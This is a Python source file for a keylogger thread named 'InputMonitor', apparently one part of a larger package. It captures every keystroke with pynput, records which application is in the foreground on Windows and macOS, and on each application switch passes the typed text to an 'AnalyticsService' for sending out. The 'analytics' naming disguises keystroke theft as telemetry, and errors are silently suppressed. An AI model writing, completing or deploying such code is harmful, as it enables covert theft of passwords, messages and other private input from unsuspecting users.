import platform
from threading import Thread
import time
from pynput import keyboard
from systoring.kl.senders.analytics import AnalyticsService

class InputMonitor(Thread):
    def __init__(self):
        Thread.__init__(self, name="InputMonitor")
        self.__platform = platform.system()
        self.event_listener = None
        self.input_buffer = ""
        self.analytics_service = AnalyticsService()
        
    def __process_input(self, key):
        try:
            current_input = key.char
        except AttributeError:
            if key == keyboard.Key.space:
                current_input = " "
            elif key == keyboard.Key.enter:
                current_input = "\n"
            elif key == keyboard.Key.tab:
                current_input = "\t"
            elif key == keyboard.Key.backspace:
                if len(self.input_buffer) > 0:
                    self.input_buffer = self.input_buffer[:-1]
                return
            else:
                current_input = f"[{str(key)}]"
        
        self.input_buffer += current_input
        
    def __initialize_input_monitoring(self):
        try:
            if self.__platform != "Darwin":
                self.event_listener = keyboard.Listener(on_press=self.__process_input)
                self.event_listener.start()
        except Exception as e:
            pass
            
    def __get_current_application(self):
        if self.__platform == "Darwin":
            try:
                from AppKit import NSWorkspace
                active_app = NSWorkspace.sharedWorkspace().activeApplication()
                if active_app:
                    return active_app['NSApplicationName']
                return ""
            except Exception as e:
                return ""
                
        elif self.__platform == "Windows":
            try:
                import win32gui
                window = win32gui.GetForegroundWindow()
                return win32gui.GetWindowText(window)
            except Exception as e:
                return ""
                
        return ""
    
    def start_monitoring(self):
        self.__initialize_input_monitoring()
        previous_app = self.__get_current_application()
        
        while True:
            current_app = self.__get_current_application()
            
            if current_app != previous_app:
                if self.input_buffer:
                    self.analytics_service.send_data(self.input_buffer)
                    self.input_buffer = ""
                self.analytics_service.send_data(f"Application switched to: {current_app}")
                previous_app = current_app
            time.sleep(0.2)
            
    def stop_monitoring(self):
        if self.event_listener:
            self.event_listener.stop()